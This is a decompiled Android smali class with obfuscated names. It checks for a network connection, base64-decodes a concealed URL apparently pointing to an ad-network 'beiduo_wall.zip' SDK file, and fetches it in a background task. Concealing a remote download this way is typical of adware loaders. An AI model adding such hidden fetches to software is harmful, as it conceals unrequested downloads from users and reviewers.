.class public final Lcom/bb/dd/b/a;
.super Ljava/lang/Object;


# static fields
.field private static a:Lcom/bb/dd/b/a;


# instance fields
.field private b:Lcom/bb/dd/b/b;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/bb/dd/b/a;->a:Lcom/bb/dd/b/a;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/bb/dd/b/a;->b:Lcom/bb/dd/b/b;

    return-void
.end method

.method public static a()Lcom/bb/dd/b/a;
    .locals 1

    sget-object v0, Lcom/bb/dd/b/a;->a:Lcom/bb/dd/b/a;

    if-nez v0, :cond_0

    new-instance v0, Lcom/bb/dd/b/a;

    invoke-direct {v0}, Lcom/bb/dd/b/a;-><init>()V

    sput-object v0, Lcom/bb/dd/b/a;->a:Lcom/bb/dd/b/a;

    :cond_0
    sget-object v0, Lcom/bb/dd/b/a;->a:Lcom/bb/dd/b/a;

    return-object v0
.end method


# virtual methods
.method public final a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)V
    .locals 4

    const/4 v2, 0x1

    const/4 v1, 0x0

    iget-object v0, p0, Lcom/bb/dd/b/a;->b:Lcom/bb/dd/b/b;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/bb/dd/b/a;->b:Lcom/bb/dd/b/b;

    invoke-virtual {v0}, Lcom/bb/dd/b/b;->getStatus()Landroid/os/AsyncTask$Status;

    move-result-object v0

    sget-object v3, Landroid/os/AsyncTask$Status;->FINISHED:Landroid/os/AsyncTask$Status;

    if-eq v0, v3, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    invoke-static {}, Lcom/bb/dd/c/b;->a()Landroid/content/Context;

    move-result-object v0

    const-string v3, "connectivity"

    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v0

    :goto_1
    if-eqz v0, :cond_0

    const-string v0, "aHR0cDovL3d3dy5iZWlkdW9hZC5jb20vZmN0L2ZpbGVEb3duTG9hZEFjdGlvbj9maWxlUGF0aD1zZGsvYmVpZHVvX3dhbGwuemlw"

    new-instance v3, Ljava/lang/String;

    invoke-static {v0}, Lcom/bb/dd/c/a;->a(Ljava/lang/String;)[B

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/lang/String;-><init>([B)V

    if-eqz v3, :cond_2

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v0

    if-eqz v0, :cond_2

    move v0, v1

    :goto_2
    if-nez v0, :cond_0

    new-instance v0, Lcom/bb/dd/b/b;

    invoke-direct {v0, p0, p1, p2, p3}, Lcom/bb/dd/b/b;-><init>(Lcom/bb/dd/b/a;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)V

    iput-object v0, p0, Lcom/bb/dd/b/a;->b:Lcom/bb/dd/b/b;

    iget-object v0, p0, Lcom/bb/dd/b/a;->b:Lcom/bb/dd/b/b;

    new-array v2, v2, [Ljava/lang/String;

    aput-object v3, v2, v1

    invoke-virtual {v0, v2}, Lcom/bb/dd/b/b;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto :goto_0

    :cond_2
    move v0, v2

    goto :goto_2

    :cond_3
    move v0, v1

    goto :goto_1
.end method
